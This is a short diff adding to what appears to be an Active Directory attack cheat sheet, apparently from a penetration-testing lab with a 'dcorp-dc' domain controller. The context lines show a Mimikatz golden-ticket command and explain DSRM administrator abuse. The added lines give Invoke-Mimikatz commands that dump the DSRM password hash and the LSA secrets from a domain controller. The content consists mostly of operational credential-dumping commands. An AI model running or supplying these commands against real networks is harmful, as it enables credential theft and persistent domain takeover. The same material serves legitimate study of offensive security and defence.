@@ -437,3 +437,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
 - DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
 - After alterting the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
+
+**Dump DSRM password (needs DA privs)**
+- `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam" -Computername dcorp-dc'`
+
+**Compare the Administrator hash with the Administrator hash of below command**
+- `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
